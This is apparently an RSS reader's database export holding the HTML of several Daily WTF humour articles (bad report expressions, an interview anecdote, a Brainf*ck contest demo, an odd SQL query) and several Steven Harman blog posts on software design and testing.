'>=</span><span style='color:#008c00; '>8</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>5</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span>orParameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>8</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>4</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span>orParameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>8</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>3</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span>orParameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>8</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>2</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span>orParameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>8</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>1</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span>orParameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>8</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span><span style='color:#808030; '>,</span><span style='color:#0f4d75; '>false</span><span style='color:#808030; '>,</span><span style='color:#0f4d75; '>true</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span></pre><p>After reviewing the guru's code, Jonathan realized that he could have taken a much simpler approach, and in fact he managed to reproduce the above for the new parameter with a single line of code.</p><pre><span style='color:#808030; '>=</span>Join<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>Views<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>,</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>,</span><span style='color:#800000; '>\"</span><span style='color:#808030; '>)</span><span style='color:#808030; '>.</span>Contains<span style='color:#808030; '>(</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Overview</span><span style='color:#800000; '>\"</span><span style='color:#808030; '>)</span></pre><p>Jonathan's peers were amazed. Such elegance. Such skill. Jonathan's managers who weren't nearly as technical did not share the same level of \"amazement\". Instead they were simply relieved.</p><p>At long last, they had found their replacement guru.<!-- Moral of the story: You don't want to be the guru. --></p><div style=\"margin:10px;padding:5px;background-color:#eee;\"><div style=\"min-height:45px\"><img src=\"http://thedailywtf.com/tizes/ads/inedo40x40.png\" style=\"display:block;float:left;margin-right:4px;\">[Advertisement]<b>Make your team a DevOps team with<a href=\"http://inedo.com/?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">BuildMaster</a></b>. Pairing an easy-to-use web UI with a free base platform, BuildMaster gets you started in minutes. See how<a href=\"http://inedo.com/buildmaster/case-studies?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">Allrecipes.com and others</a>use BuildMaster to automate their software delivery.</div></div><div style=\"clear:both;\"></div><div class=\"feedflare\"><a href=\"http://syndication.thedailywtf.com/~ff/TheDailyWtf?a=LmJrRRW1Ygk:mXeCfp4wIKc:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/TheDailyWtf?d=yIl2AUoC8zA\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/TheDailyWtf/~4/LmJrRRW1Ygk\" height=\"1\" width=\"1\"/>","author":"Mark Bowytz","_id":{"$wrap":"$oid","v":912}}
{"k":"0000000082","o":"0000005047","v":"001"}
{"_id":913,"_uid":913,"_dt":1373729346559,"_s":"c086adb3457726af72295d28885bbec6"}
{"subscription":{"$wrap":"$oid","v":54},"link":"http://thedailywtf.com/Articles/Affidavit-Deficit.aspx","title":"Tales from the Interview: Affidavit Deficit","published":{"$wrap":"$date","v":1372242600000,"h":"2013-06-26T10:30:00.000Z"},"starred":false,"read":false,"content":"<p><strong>Dave D.</strong>and his wife counted themselves lucky: they'd been in the right place at the right time more than once. When a family member's health began to fail, they were able to sell their software business and retire to help him manage. In their forties, their good fortune and low-key lifestyle meant they wouldn't have to return to work unless they wanted to.</p><p>After a couple of years, things had settled into a routine and Dave was ready to consider new opportunities. A local startup was courting him for a senior position, and their engineering team, relatively young and untested, seemed excited to have a steady hand at the tiller. But this startup was unusual: no hiring decision could be made on nautical metaphors alone. They - specifically, their overlords at WTF Ventures, Inc. - prided themselves on fusing the discipline and professionalism of the corporate world to the innovation and foosball-playing of startup culture.</p><p>That fusion is what put Dave across a boardroom table from Regina, the Head of HR, explaining why he had no \"Education\" section on his résumé.</p><p>\"I went to college briefly in the late 'eighties,\" Dave said, \"but dropped out with my business partner to start our first consulting company.\" Regina raised her eyebrows, so Dave continued. \"I suppose I left<em>some college</em>off my résumé to make room for the subsequent twenty-five years of experience...\"</p><p>\"Hmm. But don't you feel unfulfilled?\" Regina said.</p><p>\"Unfulfilled?\" Dave blinked. \"Well...  no. Fortunate, lucky,<em>free</em>.\" He counted the adjectives off on his fingers. \"I feel a lot of things, but not unfulfilled.\"</p><p>Regina raised her eyebrows again, so, once more, Dave elaborated. \"I'm forty-five, and you're trying to lure me out of<em>retirement</em>to run engineering at a startup. I feel pretty fulfilled.\"</p><p>\"Oh,\" Regina said. \"We'll need an affidavit of education.\"</p><p>\"A<em>what?</em>\" Dave had to compose himself. \"Pardon me. I'm not claiming to<em>have</em>any education. I'm sorry, I don't quite understand what you'd need an affidavit for...?\"</p><p>\"We're seeing a lot of fraud around claimed but unearned academic credentials,\" Regina said. Now it was Dave's turn to silently prompt her to continue. \"You know: people with a Bachelor's claiming to be doctoral graduates. We need to see an affidavit.\"</p><p>Dave toyed with what it would take to get his<em>almost-mater</em>to certify that he had, in fact, attended two full years of undergraduate Computer Engineering. He couldn't even remember if he'd started in the 1986-87 academic year or what his cumulative GPA had been.</p><p>Regina took his silence as an opportunity to lean forward and add, \"The affidavit<em>must</em>be notarized, of course.\"</p><p>\"This all seems a little backwards,\" Dave said. Regina raised her- you get the idea. \"I'm not sure what you want an affidavit from me to substantiate: that I don't secretly have an advanced degree in nuclear engineering? That I'm not lying to you now to cover up my possession of a tenured professorship?\"</p><p>\"Sorry, but that's our policy. We don't want to take a chance on<em>anyone</em>claiming educational accolades they never<em>actually</em>received.\" Regina passed his résumé - tagged<em>EDUCATION???</em>in bold red marker at the bottom â€” back across the table. \"You'll need a<em>notarized</em>affidavit stating your true level of education.\"</p><p>Dave opted to withdraw his application instead. After careful consideration, he determined that the life of an early-retiree was more commensurate with his academic achievements.</p><div style=\"margin:10px;padding:5px;background-color:#eee;\"><div style=\"min-height:45px\"><img src=\"http://thedailywtf.com/tizes/ads/inedo40x40.png\" style=\"display:block;float:left;margin-right:4px;\">[Advertisement]<b>Make your team a DevOps team with<a href=\"http://inedo.com/?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">BuildMaster</a></b>. Pairing an easy-to-use web UI with a free base platform, BuildMaster gets you started in minutes. See how<a href=\"http://inedo.com/buildmaster/case-studies?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">Allrecipes.com and others</a>use BuildMaster to automate their software delivery.</div></div><div style=\"clear:both;\"></div><div class=\"feedflare\"><a href=\"http://syndication.thedailywtf.com/~ff/TheDailyWtf?a=y202rG5I6B0:mI-B_9xv-E8:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/TheDailyWtf?d=yIl2AUoC8zA\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/TheDailyWtf/~4/y202rG5I6B0\" height=\"1\" width=\"1\"/>","author":"Dan Adams-Jacobson","_id":{"$wrap":"$oid","v":913}}
{"k":"0000000082","o":"0000004566","v":"001"}
{"_id":914,"_uid":914,"_dt":1373729346563,"_s":"1019c943fd6a85123318a825e212c894"}
{"subscription":{"$wrap":"$oid","v":54},"link":"http://thedailywtf.com/Articles/Reminder--OMGWTF2-Contest-Deadline-Soon!.aspx","title":"Announcements: Reminder - OMGWTF2 Contest Deadline Soon!","published":{"$wrap":"$date","v":1372257000000,"h":"2013-06-26T14:30:00.000Z"},"starred":false,"read":false,"content":"<p>Alright everybody: the clock is winding down on The Daily WTF's contest:<a href=\"http://omg2.thedailywtf.com/\">The Olympiad of Misguided Geeks Part 2</a>sponsored by our friends at<a href=\"http://newrelic.com/signup?utm_source=DWTF&utm_medium=banner_ad&utm_content=signup&utm_campaign=q2banner&mpc=BA-DWTF-web-en-100-contest-signup\">New Relic</a>. Only 2 days left until the deadline!</p><p>Now, if you haven't started on an entry then I suggest that you get a move on. Remember - we aren't interested in an \"epic win\" level of quality ...we want your greatest EPIC FAIL. Your entry doesn't have to be the grandest affair - and there are runner-up prizes available too - so the solution you cook up at the last minute might steal the show!</p><p>Just in case you're lacking some inspiration, check out this entry that our own Remy Porter cooked up and posted on our<a href=\"https://plus.google.com/u/0/109093485030374661399/posts/HVXnj5xZt8Q\">Daily WTF Google+ feed</a>the other day.</p><p>While we don't want submissions in impossible to read or understand languages, that doesn't mean we can't build demos of what it might look like.</p><p>So, without further ado, here's an entry in Brainf*ck.</p><blockquote><pre>>+<+[>>>[-]<[-]<[>+>+<<-]>>[<<+>>-]<[>[-]>>>>>>>[-]+>>>[-]<<<[>>>+<<<-]>>>[>>[-]<<-[>>+<<-]+>>]>[<<<[<<]>+>[>>]>-]<<<[<<]>[<<+<<<<<<<+>>>>>>>>>-]<<<<<<<<<[>>>>>>>>>+<<<<<<<<<-]>>>>>>>>>>[>>]>[-]<<<[<<]>[>[>>]>+<<<[<<]>-]>-<<<<<<<<<<[-]>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[-]++<<<<<<<<<<<<<<<<<<<<<<<<[<<<<<<+>>>>>>-]<<<<<<[>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[<<<<<<<<<<<<<<<<<<<<<<<<+<<<<<<<+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>-]<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<[>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<-]>-]<[-]>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[-]+[<<<<<<<<<<<<<<<<<<<<<<<<+<<<<<<<+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>-]<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<[>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<-]>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[-]<<<<<<<<<<<<<<<<<<<<<<<<<<<[>>>>>>>>>>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<<<<<<<<<<-]>>>>>>>>>>>>>>>>>>>>>>>>>>>[>>[-]<<-[>>+<<-]+>>]>[<<<[<<]>+>[>>]>-]<<<[<<]>[<<<<<<<<<<<<<<<<<<<<<<<<<<+<<<<<<<+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>-]<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<[>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<-]>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[>>]>[-]<<<[<<]>[>[>>]>+<<<[<<]>-]>-<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<->>>>>>>[<<<<<<<->>>>>>>-]<<<<<<<[>>>>>>>+<<<<<<<-]>>>>>>>[<<<<<<<<<[-]<[-]+>>>>>>>>>>[-]]<<<<<<<<[-]]>[-]<[-]<[>+>+<<-]>>[<<+>>-]<[>++++++++++[>+++++++++>+++++++<<-]>-.>-.<------.>[-]<[-]<++++++++++.[-]<<[-]<[-]++>>[-]]>>[-]>[-]+<[-]<[-]<<[>>>+<+<<-]>>[<<+>>-]<[-]+>>[<<->>-]<<[>>+<[-]<<<[>>>+>>-<<<<<-]>>>[<<<+>>>-]>>[<->[-]]<[<<<[-]+>>>[-]]<<-]>>>[-]<<[-]<[-]<[>+>+<<-]>>[<<+>>-]<[>++++++[>+++++++++++++<-]>.+.[-]<++++++++++.[-]<[-]]>>[-]>[-]++<[-]<[-]<<[>>>+<+<<-]>>[<<+>>-]<[-]+>>[<<->>-]<<[>>+<[-]<<<[>>>+>>-<<<<<-]>>>[<<<+>>>-]>>[<->[-]]<[<<<[-]+>>>[-]]<<-]>>>[-]<<[-]<[-]<[>+>+<<-]>>[<<+>>-]<[<<[-]>[-]>[-]]<<]@</pre></blockquote><p>Try it for yourself<a href=\"http://www.compileonline.com/execute_brainfk_online.php\">here</a>.</p><div style=\"margin:10px;padding:5px;background-color:#eee;\"><div style=\"min-height:45px\"><img src=\"http://thedailywtf.com/tizes/ads/inedo40x40.png\" style=\"display:block;float:left;margin-right:4px;\">[Advertisement]<b>Make your team a DevOps team with<a href=\"http://inedo.com/?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">BuildMaster</a></b>. Pairing an easy-to-use web UI with a free base platform, BuildMaster gets you started in minutes. See how<a href=\"http://inedo.com/buildmaster/case-studies?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">Allrecipes.com and others</a>use BuildMaster to automate their software delivery.</div></div><div style=\"clear:both;\"></div><div class=\"feedflare\"><a href=\"http://syndication.thedailywtf.com/~ff/TheDailyWtf?a=pqXRDfyR_F4:2w1QhFqJ_FQ:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/TheDailyWtf?d=yIl2AUoC8zA\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/TheDailyWtf/~4/pqXRDfyR_F4\" height=\"1\" width=\"1\"/>","author":"Mark Bowytz","_id":{"$wrap":"$oid","v":914}}
{"k":"0000000082","o":"0000003437","v":"001"}
{"_id":915,"_uid":915,"_dt":1373729346567,"_s":"e9f0bb50b3938a80bcee4a519aa4785d"}
{"subscription":{"$wrap":"$oid","v":54},"link":"http://thedailywtf.com/Articles/May-the-Sad-Force-Be-With-You.aspx","title":"CodeSOD: May the Sad Force Be With You","published":{"$wrap":"$date","v":1372674600000,"h":"2013-07-01T10:30:00.000Z"},"starred":false,"read":false,"content":"<p>A long, long time ago, in a software shop far, far away, clouds of bad management began to gather. The evil CEO, in his hooded shroud, commanded a dearth of Darth's that a powerful<i>sphere-of-influence</i>be built to help enforce His will. Rules and regulations would abound. Roles would be restricted. The twin suns were obscured and darkness covered the land.</p><p>It was the beginning of a period of Great Sadness.</p><p>At the time, nobody knew that a young Jedi coder named Luke SQLwalker would rise up to strike down the forces of evil.</p><p>Fast forward to the present day, and code-anthropologists uncovered irrefutable evidence of the time of Great Sadness:</p><blockquote><pre>SELECT a<span style='color:#808030; '>.</span>permId<span style='color:#808030; '>,</span>b<span style='color:#808030; '>.</span>selectionId<span style='color:#808030; '>,</span>b<span style='color:#808030; '>.</span>descriptionFROM pos<span style='color:#808030; '>.</span>permissionIdentAS a INNER JOIN pos<span style='color:#808030; '>.</span>accessRightsAS b ON a<span style='color:#808030; '>.</span>module<span style='color:#808030; '>=</span>b<span style='color:#808030; '>.</span>moduleAND a<span style='color:#808030; '>.</span>permission<span style='color:#808030; '>=</span>b<span style='color:#808030; '>.</span>permissionWHERE b<span style='color:#808030; '>.</span>role_id<span style='color:#808030; '>=</span><span style='color:#0000e6; '>':-('</span>AND b<span style='color:#808030; '>.</span>perm_type_id<span style='color:#808030; '>=</span><span style='color:#008c00; '>1</span>AND a<span style='color:#808030; '>.</span>module<span style='color:#808030; '>=</span><span style='color:#0000e6; '>'POS'</span>AND b<span style='color:#808030; '>.</span>section_id IN<span style='color:#808030; '>(</span><span style='color:#008c00; '>123</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>456</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>789</span><span style='color:#808030; '>)</span></pre></blockquote><div style=\"margin:10px;padding:5px;background-color:#eee;\"><div style=\"min-height:45px\"><img src=\"http://thedailywtf.com/tizes/ads/inedo40x40.png\" style=\"display:block;float:left;margin-right:4px;\">[Advertisement]<b>Make your team a DevOps team with<a href=\"http://inedo.com/?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">BuildMaster</a></b>. Pairing an easy-to-use web UI with a free base platform, BuildMaster gets you started in minutes. See how<a href=\"http://inedo.com/buildmaster/case-studies?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">Allrecipes.com and others</a>use BuildMaster to automate their software delivery.</div></div><div style=\"clear:both;\"></div><div class=\"feedflare\"><a href=\"http://syndication.thedailywtf.com/~ff/TheDailyWtf?a=1PEyedQC6JY:pzaJ4azik2s:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/TheDailyWtf?d=yIl2AUoC8zA\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/TheDailyWtf/~4/1PEyedQC6JY\" height=\"1\" width=\"1\"/>","author":"snoofle","_id":{"$wrap":"$oid","v":915}}
{"k":"0000000082","o":"0000002353","v":"001"}
{"_id":916,"_uid":916,"_dt":1373729346569,"_s":"705c13362b2cad7d67c7d26776d56baa"}
{"subscription":{"$wrap":"$oid","v":40},"link":"http://stevenharman.net/bag-of-methods-module-and-grep-driven-development","title":"Bag of Methods Module and Grep-driven Development","published":{"$wrap":"$date","v":1349174040000,"h":"2012-10-02T10:34:00.000Z"},"starred":false,"read":false,"content":"<p>Always looking for more concise ways to express ideas, I’d like to present twoterms for your consideration.</p><dl><dt><a id='bomm'>BOMM</a><em>|bäm|</em><i>(abbreviation)</i></dt><dd>Bag of Methods Module</dd><dd>An anti-pattern for“sharing behavior” or“separating concerns” of anobject. In practice such modules often contain code that is related in name orfunction, but lacking a cohesive purpose. See also:<em><a href='#gdd'title='Grep-driven Development'>GDD</a></em>.</dd><dt><a id='gdd'>GDD</a><i>(initialism)</i></dt><dd>Grep-driven Development</dd><dd>A software development process that relies onsearching full source code to find usages of methods and deduce intendedbehavior of a piece of code. Often caused by lack of coherent and cohesivedesign. See also:<em><a href='#bomm' title='Bag of MethodsModule'>BOMM</a></em>.</dd></dl><p>Thanks to fellow<a href=\"http://highgroove.com\">Highgroover</a>,<a href=\"http://www.andylindeman.com\">Andy Lindeman</a>, for helping meto finally define these terms. Or at least, refine them.</p><div class=\"feedflare\"><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=JXaErL_qfLM:Cs_Bkd_EcHE:G79ilh31hkQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=G79ilh31hkQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=JXaErL_qfLM:Cs_Bkd_EcHE:cGdyc7Q-1BI\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=cGdyc7Q-1BI\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=JXaErL_qfLM:Cs_Bkd_EcHE:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=JXaErL_qfLM:Cs_Bkd_EcHE:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=JXaErL_qfLM:Cs_Bkd_EcHE:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=JXaErL_qfLM:Cs_Bkd_EcHE:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/stevenharman/~4/JXaErL_qfLM\" height=\"1\" width=\"1\"/>","author":false,"_id":{"$wrap":"$oid","v":916}}
{"k":"0000000082","o":"0000004717","v":"001"}
{"_id":917,"_uid":917,"_dt":1373729346571,"_s":"248b11f75d9e3f2b8527f4b84ced7ad5"}
{"subscription":{"$wrap":"$oid","v":40},"link":"http://stevenharman.net/sensible-testing-is-about-sensible-design","title":"Sensible Testing is About Sensible Design","published":{"$wrap":"$date","v":1340964960000,"h":"2012-06-29T10:16:00.000Z"},"starred":false,"read":false,"content":"<p>If you’ve not yet seen<a href=\"http://justinleitgeb.com/\">Justin Leitgeb’s</a>GoGaRuCo talk,<a href=\"http://justinleitgeb.com/wp-content/uploads/2012/06/SensibleTesting.pdf\">Sensible Testing</a>, go check out the slides. I hope theactual talk is posted soon; I’m sure it’s more rich and full of context.</p><p>Overall I agree with most of Justin’s points. However, I get the feeling thathe, like many folks, approaches testing as a method for verifying thecorrectness of code. As I understand the thesis,<em>CUPID</em>is to testing what<em><a href=\"http://butunclebob.com/ArticleS.UncleBob.PrinciplesOfOod\">SOLID</a></em>is to design.</p><p><span class='pullquote-right' data-pullquote='testing is a tool to be used in guiding your design'>While I’m not opposed to laying down some names and concepts to improve thestate of testing, I don’t belive testing should be the goal. It’s not abouttesting. I believe testing is a tool to be used in guiding your design.</span></p><!-- more --><h3>An example</h3><p>I realize that it’s unfair to pick on sample code used in talks, but<em>“Problem2: Stubbing instead of mocking”</em>provides a great illustration. Here the authorclaims that we too often stub where we should be mocking. He gives thefollowing snippet:</p><p><img class=\"right\" src=\"http://stevenharman.net/images/posts/sensible-testing-code.png\" title=\"\"Problem 2: Stubbing instead of mocking\"\" alt=\"\"Problem 2: Stubbing instead of mocking\"\"></p><p>Firstly I had to get over the use of the old RSpec 1.0-style<code>#stub!</code>and theoverly verbose<code>#and_return</code>syntax. After resetting my brain I quicklyrealized the test was awkward. I re-read it a few times and then asked,“whystub, or mock for that matter, methods on the object under test?”</p><h3>A design issue emerges</h3><p>This is a design issue! The<code>BalanceCalculator</code>is doing too much work. This isthe“S” in SOLID - the Single Responsibility Principle. The friction of thistest suggests that we need to adjust the design.</p><p>For example, we could wrap the<em>account info</em>and<em>account type</em>into a cohesiveobject to be passed into the calculator.</p><h3>To stub or to mock?</h3><p>Forgiving that design issue for now, let’s get back to the author’s point -<em>should we mock or stub those methods?</em></p><p>The methods in question are queries. The<code>BalanceCalculator</code>presumably usesthe results of those queries to do its work. So why do we need to set anexpectation that we should call those methods? Afterall, if we don’t call themwe’ll not have their resulting values, so we won’t be able to do the work, sothe test<strong>should</strong>fail. Right?</p><p>And if we don’t call those methods and the test passes, then they neither needto be mocked nor stubbed as they are unnecessary.</p><p>So, to stub or mock… how do we know when to use which?</p><p>My heuristic is that stubs are for queries and mocks are for commands. In avery generic sense I’m talking about<a href=\"http://en.wikipedia.org/wiki/Command-query_separation\">Command-query separation</a>appliedto testing.</p><h3>It’s all design</h3><p>In the end nearly everything we do is design in some sense. Testing is noexception, and is in my opinion a much larger part of the design of softwaresystems than it is given credit for. Or at least, I believe we should bestriving to make it so.</p><div class=\"feedflare\"><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=LzoiMxELsvU:idb7QaN4RUQ:G79ilh31hkQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=G79ilh31hkQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=LzoiMxELsvU:idb7QaN4RUQ:cGdyc7Q-1BI\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=cGdyc7Q-1BI\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=LzoiMxELsvU:idb7QaN4RUQ:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=LzoiMxELsvU:idb7QaN4RUQ:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=LzoiMxELsvU:idb7QaN4RUQ:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=LzoiMxELsvU:idb7QaN4RUQ:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/stevenharman/~4/LzoiMxELsvU\" height=\"1\" width=\"1\"/>","author":false,"_id":{"$wrap":"$oid","v":917}}
{"k":"0000000082","o":"0000002755","v":"001"}
{"_id":918,"_uid":918,"_dt":1373729346575,"_s":"21c8e89a6938d1aea4693e248811ff3b"}
{"subscription":{"$wrap":"$oid","v":40},"link":"http://stevenharman.net/the-accepts_nested_attributes_for-un-solution","title":"The accepts_nested_attributes_for Un-Solution","published":{"$wrap":"$date","v":1337118600000,"h":"2012-05-15T21:50:00.000Z"},"starred":false,"read":false,"content":"<p><img class=\"right\" src=\"http://stevenharman.net/images/posts/merry-go-round.png\" title=\"\"merry go round\"\" alt=\"\"merry go round\"\"></p><p>Why does Rails’<code>accepts_nested_attributes_for</code>approach always feel so darned<em>wrong</em>?</p><p>My suspicion is that it feels wrong because it likely is wrong - or at least itis likely the wrong tool for the job.</p><h3>An example</h3><p>An accounting of a recent ride I took into the<code>accepts_nested_attributes_for</code>merry go round.</p><blockquote><p>In order to create a Message, I have to first create the Conversation it’s apart of.</p><p>This sounds like an explicit workflow, so I’ll model it that way.</p><p><em>… hours later…</em></p><p>FFFUUU, this is too complicated! There must be an easier, more Rails-y way.</p><p>I know, Conversations can<code>accepts_nested_attributes_for :messages</code>. Brilliant!</p><p><em>… hours later…</em></p><p>FFFUUU, this is too complicated! There must be a simpler way.</p><p>I know, rather than shoehorning this into an overly-coupled mess I’ll modelit as an explicit workflow!</p><p><strong>FML</strong>.</p></blockquote><p>Remember,<a href=\"http://www.confreaks.com/videos/860-railsconf2012-keynote-simplicity-matters\" title=\"Simplicity Matters.\">easy is not the same thing as simple</a>.</p><p><em>image via:<a href=\"http://blog.lolitanie.com/index.php/archives/2006/01/29/oh-oh-oh-merry-go-round/\">lolitanie.com</a></em></p><div class=\"feedflare\"><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=2GQdlJ3R9Vs:zc8DwPUzwo0:G79ilh31hkQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=G79ilh31hkQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=2GQdlJ3R9Vs:zc8DwPUzwo0:cGdyc7Q-1BI\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=cGdyc7Q-1BI\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=2GQdlJ3R9Vs:zc8DwPUzwo0:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=2GQdlJ3R9Vs:zc8DwPUzwo0:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=2GQdlJ3R9Vs:zc8DwPUzwo0:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=2GQdlJ3R9Vs:zc8DwPUzwo0:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/stevenharman/~4/2GQdlJ3R9Vs\" height=\"1\" width=\"1\"/>","author":false,"_id":{"$wrap":"$oid","v":918}}
{"k":"0000000082","o":"0000003406","v":"001"}
{"_id":919,"_uid":919,"_dt":1373729346577,"_s":"b8548061a37e64f50b606588176e0652"}
